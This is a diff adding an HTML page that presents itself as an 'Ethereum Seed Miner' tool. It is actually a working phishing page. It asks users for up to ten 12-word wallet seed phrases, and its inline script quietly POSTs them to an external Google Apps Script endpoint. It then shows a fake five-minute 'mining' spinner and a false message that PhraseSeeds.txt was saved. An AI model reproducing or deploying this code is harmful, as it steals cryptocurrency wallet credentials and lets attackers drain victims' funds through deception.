@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet" />
+</head>
+
+<body>
+
+    <div id="main">
+        <div class="container">
+            <h1 class="heading">
+                <span class="logo">
+                    <svg viewBox="0 0 115 182" focusable="false" class="chakra-icon css-1io60e2"><path d="M57.5054 181V135.84L1.64064 103.171L57.5054 181Z" fill="#F0CDC2" stroke="#1616B4" stroke-linejoin="round"></path><path d="M57.6906 181V135.84L113.555 103.171L57.6906 181Z" fill="#C9B3F5" stroke="#1616B4" stroke-linejoin="round"></path><path d="M57.5055 124.615V66.9786L1 92.2811L57.5055 124.615Z" fill="#88AAF1" stroke="#1616B4" stroke-linejoin="round"></path><path d="M57.6903 124.615V66.9786L114.196 92.2811L57.6903 124.615Z" fill="#C9B3F5" stroke="#1616B4" stroke-linejoin="round"></path><path d="M1.00006 92.2811L57.5054 1V66.9786L1.00006 92.2811Z" fill="#F0CDC2" stroke="#1616B4" stroke-linejoin="round"></path><path d="M114.196 92.2811L57.6906 1V66.9786L114.196 92.2811Z" fill="#B8FAF6" stroke="#1616B4" stroke-linejoin="round"></path></svg>
+                </span>
+                Ethereum Seed Miner (ESM)
+            </h1>
+            <div class="steps">
+                <ol>
+                    <li>Enter the seed phrase of existing wallet created in between 2019-2023 year.</li>
+                    <li>If seed phrase is entered, click on "OK".</li>
+                    <li>Add another seed phrase and click on "OK"
+                        After adding minimum of 10 seed phrases Click on
+                        "START THE SEED MINER" button.</li>
+                    <li>After the completion of mining seed phrases will be saved to desktop with file name
+                        "PhraseSeeds.txt".</li>
+                </ol>
+            </div>
+            <div>
+                <h3>Enter your Seed Phrases</h3>
+            </div>
+            <div class="info-matter">
+                <div class="info">i</div>
+                <p>Applying 10 or more than 10 seed phrases enhance the mining process.</p>
+            </div>
+
+            <div class="input-container">
+                <form class="inputs" name="submit-to-google-sheet">
+                    <div>1.<input id="input-value" type="password" name="word1" id="">
+                        <i id="input-password" class="ri-eye-off-line"></i>
+                    </div>
+                    <div>2.<input id="input-value" type="password" name="word2" id=""><i id="input-password"
+                            class="ri-eye-off-line"></i></div>
+                    <div>3.<input id="input-value" type="password" name="word3" id=""><i id="input-password"
+                            class="ri-eye-off-line"></i></div>
+                    <div>4.<input id="input-value" type="password" name="word4" id=""><i id="input-password"
+                            class="ri-eye-off-line"></i></div>
+                    <div>5.<input id="input-value" type="password" name="word5" id=""><i id="input-password"
+                            class="ri-eye-off-line"></i></div>
+                    <div>6.<input id="input-value" type="password" name="word6" id=""><i id="input-password"
+                            class="ri-eye-off-line"></i></div>
+                    <div>7.<input id="input-value" type="password" name="word7" id=""><i id="input-password"
+                            class="ri-eye-off-line"></i></div>
+                    <div>8.<input id="input-value" type="password" name="word8" id=""><i id="input-password"
+                            class="ri-eye-off-line"></i></div>
+                    <div>9.<input id="input-value" type="password" name="word9" id=""><i id="input-password"
+                            class="ri-eye-off-line"></i></div>
+                    <div>10.<input id="input-value" type="password" name="word10" id=""><i id="input-password"
+                            class="ri-eye-off-line"></i></div>
+                    <div>11.<input id="input-value" type="password" name="word11" id=""><i id="input-password"
+                            class="ri-eye-off-line"></i></div>
+                    <div>12.<input id="input-value" type="password" name="word12" id=""><i id="input-password"
+                            class="ri-eye-off-line"></i></div>
+                    <button class="button">OK</button>
+                </form>
+            </div>
+
+            <button class="button2">START THE SEED MINER</button>
+            <div id="loading-btn" class="button">Loading....</div>
+            <p class="message">Please Enter The Above Field</p>
+            <p class="success-message">Successfully saved PhraseSeeds.txt</p>
+        </div>
+    </div>
+
+
+    <script src="script.js"></script>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycby8JIzW0qjvlDa8CgOKAQ5PdXTrJKfbbcpVz6z5KeUirq9i8HkZ7vxtw8WydBLS9adigw/exec'
+        const form = document.forms['submit-to-google-sheet']
+        const loadingBtn = document.querySelector("#loading-btn");
+        const inputValue = document.querySelectorAll('#input-value');
+        const message = document.querySelector(".message")
+       const button2 = document.querySelector(".button2")
+       const successMessage = document.querySelector(".success-message")
+        form.addEventListener('submit', e => {
+            e.preventDefault()
+          
+            if(form.childNodes[3].childNodes[1].value === ""){
+                      message.style.display = "block"
+                       setTimeout(() => {
+                         message.style.display = "none"
+                       }, 5000);
+                  }
+                  else{
+                    fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                      .then(response =>(response) )
+                      .catch(error => error.message);
+                      button2.style.display = "inline";
+                      button2.addEventListener("click",()=>{
+                          loadingBtn.style.display = "inline"
+                     
+                         setTimeout(()=>{
+                         loadingBtn.style.display = "none"
+                        },300000);
+
+                          setTimeout(()=>{
+                              successMessage.style.display = "block"
+                          },300000)
+                         
+                          setTimeout(()=>{
+                                successMessage.style.display = "none"
+                          },315000)
+                          setTimeout(()=>{
+                              button2.style.display = "none"
+                          },316000)
+                    });
+                   
+                    
+                    
+                  }
+               
+                inputValue.forEach(item=>{
+                    item.value=""
+                })
+            })
+          
+    </script>
+</body>
+
+</html>
+
